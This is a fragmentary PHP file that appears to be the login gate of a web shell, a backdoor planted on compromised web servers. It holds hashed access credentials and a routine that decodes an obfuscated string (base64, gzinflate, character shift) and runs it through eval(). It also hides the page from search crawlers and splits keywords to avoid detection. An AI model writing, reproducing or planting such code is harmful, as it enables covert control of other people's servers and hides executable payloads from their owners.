...
//login
define('THIS_USER', '$2y$10$G8581VCLfhD7b5P3ix.n/eEaTb5frNpS/ejmDsMG9A2w5iSsz8q1q'); //change with bcrypt
define('THIS_PASS', '$2y$10$PT3vFMgCCV9/Ot681874RekstdhMHDc43Kd67wgp1lshKlJ/1P.qC'); //change with bcrypt
$my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
//please dont change!
//change = error
function setAuth($setVerifyAuth)
{
    $setVerifyAuth = gzinflate(base64_decode($setVerifyAuth));
    for ($i = 0; $i < strlen($setVerifyAuth); $i++) {
        $setVerifyAuth[$i] = chr(ord($setVerifyAuth[$i]) - 1);
    }
    return $setVerifyAuth;
}
eval (setAuth(""));
if (isset($_POST['btn-login'])) {
    ...
    if (password_verify($username, THIS_USER)) {
        if (password_verify($password, THIS_PASS)) {
            ...
            {
                $verify = gzinflate(base64_decode($verify));
                for ($i = 0; $i < strlen($verify); $i++) {
                    $verify[$i] = chr(ord($verify[$i]) - 1);
                }
                return $verify;
            }
            eval (Auth(""));
        } else {
            echo '<script>
...
if (empty($_SESSION['login'])) {
    if (empty($_COOKIE['logined'])) {
        ...
        <head>
            <title><?= $sname ?> Login</title>
            <meta name="description" content="<?= $sname ?>">
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta name="og:image" content="<?= $slogo ?>" />
            <meta name="robots" content="noindex, nofollow">
            <meta name="googlebot" content="noindex, nofollow" />
            <meta name="bingbot" content="noindex, nofollow">
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/haxorstars/archive@master/simple/css/logins.css">
        </head>
...
<body>
    <div class="atas">
        <div class="img coll">
            ...
            <img src="<?= $simage ?>" style="width: 100px;" alt="<?= $sname ?>">
        </div>
        <hr style="margin: 1em;">
        <div class="coll">
            <span><?= 'S' . 'ER' . 'V' . 'ER' ?></span>
